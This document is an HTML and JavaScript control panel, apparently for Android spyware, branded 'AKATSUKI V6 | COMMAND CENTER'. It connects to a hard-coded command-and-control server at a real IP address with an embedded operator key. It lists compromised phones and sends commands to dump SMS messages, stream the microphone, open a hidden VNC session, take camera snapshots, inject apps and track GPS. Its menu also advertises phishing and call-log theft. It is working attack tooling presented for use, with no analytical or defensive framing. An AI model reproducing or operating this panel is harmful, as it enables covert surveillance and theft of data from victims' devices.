<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>AKATSUKI V6 | COMMAND CENTER</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        :root { --red: #ff1a1a; --bg: #050505; --panel: #111; --border: #222; --text: #eee; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: var(--bg); color: var(--text); display: flex; height: 100vh; overflow: hidden; }

        /* SIDEBAR */
        aside { width: 280px; background: #000; border-right: 1px solid var(--border); display: flex; flex-direction: column; }
        .logo { padding: 30px; text-align: center; color: var(--red); font-weight: bold; letter-spacing: 5px; border-bottom: 1px solid var(--border); }
        .nav { flex: 1; padding: 10px 0; overflow-y: auto; }
        .nav-item { padding: 12px 25px; color: #777; cursor: pointer; font-size: 13px; display: flex; align-items: center; transition: 0.3s; }
        .nav-item:hover { color: #fff; background: rgba(255, 26, 26, 0.1); border-left: 3px solid var(--red); }

        /* MAIN DASHBOARD */
        main { flex: 1; display: flex; flex-direction: column; }
        header { padding: 20px 40px; background: #000; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .grid { flex: 1; padding: 30px; display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; overflow-y: auto; }

        /* DEVICE CARD */
        .card { background: var(--panel); border: 1px solid var(--border); border-radius: 5px; padding: 20px; transition: 0.3s; }
        .card:hover { border-color: var(--red); box-shadow: 0 0 15px rgba(255, 26, 26, 0.1); }
        .card-title { color: var(--red); font-size: 18px; margin-bottom: 10px; display: flex; justify-content: space-between; }
        .attack-box { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-top: 15px; }
        .btn-atk { background: #000; border: 1px solid #333; color: #888; padding: 8px; font-size: 10px; cursor: pointer; border-radius: 3px; text-transform: uppercase; }
        .btn-atk:hover { background: var(--red); color: #fff; border-color: var(--red); }

        /* REAL-TIME TERMINAL MODAL */
        #terminal { position: fixed; bottom: 20px; right: 20px; width: 450px; height: 500px; background: #000; border: 1px solid var(--red); border-radius: 8px; display: none; flex-direction: column; z-index: 1000; box-shadow: 0 0 30px rgba(0,0,0,0.8); }
        .term-head { padding: 10px; background: var(--red); color: #000; font-weight: bold; font-size: 12px; display: flex; justify-content: space-between; }
        .term-body { flex: 1; padding: 15px; font-family: 'Consolas', monospace; font-size: 12px; overflow-y: auto; color: #00ff00; line-height: 1.5; }
        .close-term { cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

<aside>
    <div class="logo">AKATSUKI</div>
    <div class="nav">
        <div class="nav-item">🏠 Dashboard</div>
        <div class="nav-item">📡 Realtime Map</div>
        <div class="nav-item">🖥️ Hidden VNC</div>
        <div class="nav-item">📂 File Manager</div>
        <div class="nav-item">🏛️ Phishing Center</div>
        <div class="nav-item">🎙️ Mic Listening</div>
        <div class="nav-item">💬 SMS Intercept</div>
        <div class="nav-item">📞 Call Logs</div>
    </div>
</aside>

<main>
    <header>
        <div>STATUS: <span id="conn-status" style="color: #00ff00;">CONNECTED</span></div>
        <div style="color: var(--red)">51.75.118.169:20300</div>
    </header>
    <div class="grid" id="device-grid">
        </div>
</main>

<div id="terminal">
    <div class="term-head">
        <span id="term-title">LIVE_ATTACK_LOGS</span>
        <span class="close-term" onclick="closeTerminal()">[X]</span>
    </div>
    <div class="term-body" id="term-content">
        Waiting for device response...
    </div>
</div>

<script>
    const socket = io("http://51.75.118.169:20300", { 
        query: { type: 'mastermind', key: 'octopus_god_mode' } 
    });

    socket.on('load_targets', (targets) => {
        Object.keys(targets).forEach(id => addDevice(id, targets[id]));
    });

    socket.on('update_grid', (res) => addDevice(res.id, res.data));

    // RECEIVE DATA (SMS, MIC, ETC)
    socket.on('render_live_data', (payload) => {
        openTerminal(payload.type);
        const content = document.getElementById('term-content');
        const time = new Date().toLocaleTimeString();
        content.innerHTML += `<div style="margin-bottom:8px;">[${time}] <span style="color:white">${payload.data}</span></div>`;
        content.scrollTop = content.scrollHeight;
    });

    function addDevice(id, data) {
        let grid = document.getElementById('device-grid');
        let card = document.getElementById(id);
        
        const html = `
            <div class="card-title">
                <span>${data.model || 'Unknown Device'}</span>
                <span style="font-size:10px; color:#555;">${id.substring(0,8)}</span>
            </div>
            <p style="font-size:11px; color:#666;">IP: ${data.ip || '0.0.0.0'} | Battery: ${data.battery || '--'}%</p>
            <div class="attack-box">
                <button class="btn-atk" onclick="exec('${id}','sms_dump')">Get SMS</button>
                <button class="btn-atk" onclick="exec('${id}','mic_live')">Mic Access</button>
                <button class="btn-atk" onclick="exec('${id}','vnc_hidden')">Hidden VNC</button>
                <button class="btn-atk" onclick="exec('${id}','cam_snap')">Camera</button>
                <button class="btn-atk" onclick="exec('${id}','inject_app')">Inject</button>
                <button class="btn-atk" onclick="exec('${id}','gps_track')">GPS</button>
            </div>
        `;

        if(card) {
            card.innerHTML = html;
        } else {
            const div = document.createElement('div');
            div.id = id;
            div.className = 'card';
            div.innerHTML = html;
            grid.appendChild(div);
        }
    }

    function exec(targetId, action) {
        socket.emit('run_action', { targetId, action });
        openTerminal(action.toUpperCase());
        document.getElementById('term-content').innerHTML = `[!] Command Sent: ${action}<br>[*] Awaiting Target Response...<br>`;
    }

    function openTerminal(title) {
        document.getElementById('terminal').style.display = 'flex';
        document.getElementById('term-title').innerText = "LIVE_DATA: " + title;
    }

    function closeTerminal() {
        document.getElementById('terminal').style.display = 'none';
        document.getElementById('term-content').innerHTML = "";
    }
</script>

</body>
</html>
